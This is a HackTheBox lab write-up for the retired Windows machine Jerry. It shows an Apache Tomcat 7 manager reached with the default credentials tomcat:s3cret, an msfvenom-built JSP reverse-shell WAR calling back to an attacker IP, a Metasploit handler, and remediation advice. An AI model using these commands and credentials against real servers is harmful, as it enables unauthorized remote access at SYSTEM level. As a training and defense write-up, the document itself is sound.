HTB Jerry: Tomcat manager deploy straight to SYSTEM

retired-machineeasy

Jerry is a retired HackTheBox easy Windows machine and the shortest write-up in this series. Synopsis: default Tomcat manager creds, one malicious WAR upload, and the service account is already SYSTEM.

$ Enumeration — one port, one console

# bash: spot Tomcat plus defaults
nmap -sC -sV 10.10.10.95   # 8080 Apache Tomcat/7.0.88
# manager login: tomcat:s3cret

A single interesting port: 8080 serving Apache Tomcat 7. The manager login falls to the default pair tomcat:s3cret. Management consoles with vendor defaults are a foothold.

$ Exploitation — malicious WAR deploy

# bash: build WAR, deploy, catch SYSTEM
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.23 LPORT=4444 -f war > shell.war
# manager GUI -> Deploy -> upload shell.war -> browse /shell/
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD java/jsp_shell_reverse_tcp; set LHOST 10.10.14.23; run"
# --- or fully automated: use exploit/multi/http/tomcat_mgr_deploy

Deploy the WAR through the upload form, trigger it, catch the session. The manual route shows the mechanism; the Metasploit module automates the whole chain. Match jsp_shell to the Tomcat/JSP stack.

$ Flags — no privesc needed

The Tomcat service runs as SYSTEM, so the deployed shell lands at the highest privilege and both flags fall in one session. Flag values redacted per HTB rules; earn them in your own lab.

$ Dead ends

Manager-script API calls before the HTML manager (the web form deploy is simpler) and generating a WAR for the wrong Java payload type.

$ Remediation notes

Change every default console credential, restrict manager access by IP, run services as least-privilege accounts, and patch or retire Tomcat 7. Written by Lucky Thandel.
